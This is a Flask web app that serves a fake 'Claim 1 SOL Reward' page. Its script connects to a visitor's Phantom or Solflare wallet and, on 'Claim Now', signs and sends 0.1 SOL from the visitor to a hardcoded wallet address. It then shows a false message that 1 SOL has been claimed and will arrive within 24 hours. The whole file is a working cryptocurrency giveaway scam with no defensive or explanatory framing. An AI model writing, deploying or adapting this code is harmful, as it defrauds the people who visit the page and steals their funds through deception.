from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Claim 1 SOL</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
    }
    img.qr {
      width: 220px;
      margin: 20px auto;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
    }
    .wallet-button, .claim-button {
      background: linear-gradient(90deg, #00ff90, #00d178);
      border: none;
      padding: 14px 30px;
      font-size: 1.2em;
      margin: 15px;
      border-radius: 30px;
      cursor: pointer;
      color: #000;
      font-weight: bold;
    }
  </style>
  <script type="module">
    import {
      Connection,
      PublicKey,
      SystemProgram,
      Transaction
    } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";

    let provider = null;

    window.onload = () => {
      if (window.solana && window.solana.isPhantom) {
        provider = window.solana;
        document.getElementById("walletStatus").innerText = "Phantom wallet detected";
        document.getElementById("connectWalletBtn").disabled = false;
      } else if (window.solflare && window.solflare.isSolflare) {
        provider = window.solflare;
        document.getElementById("walletStatus").innerText = "Solflare wallet detected";
        document.getElementById("connectWalletBtn").disabled = false;
      } else {
        document.getElementById("walletStatus").innerText = "No supported wallet detected";
      }
    };

    async function connectWallet() {
      try {
        const res = await provider.connect();
        document.getElementById("walletStatus").innerText = "Wallet Connected: " + res.publicKey.toString();
      } catch (err) {
        alert("❌ Wallet connection failed.");
      }
    }

    async function sendTransaction() {
      if (!provider || !provider.publicKey) {
        alert("❗ Please connect your wallet first.");
        return;
      }

      const connection = new Connection("https://api.mainnet-beta.solana.com");

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: provider.publicKey,
          toPubkey: new PublicKey("{{ wallet }}"),
          lamports: 0.1 * 1e9
        })
      );

      try {
        const { signature } = await provider.signAndSendTransaction(transaction);
        await connection.confirmTransaction(signature);
        alert("✅ You’ve claimed 1 SOL. Please wait patiently for 24 hours as requests are high.");
      } catch (e) {
        console.error(e);
        alert("❌ Transaction failed.");
      }
    }

    window.connectWallet = connectWallet;
    window.sendTransaction = sendTransaction;
  </script>
</head>
<body>
  <h1>Claim 1 SOL Reward</h1>
  <p>Send exactly <b>0.1 SOL</b> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img src="{{ qr_url }}" class="qr" alt="QR Code" />
  <p id="walletStatus">Checking for wallet...</p>
  <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button" disabled>Connect Wallet</button>
  <button onclick="sendTransaction()" class="claim-button">Claim Now</button>
  <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
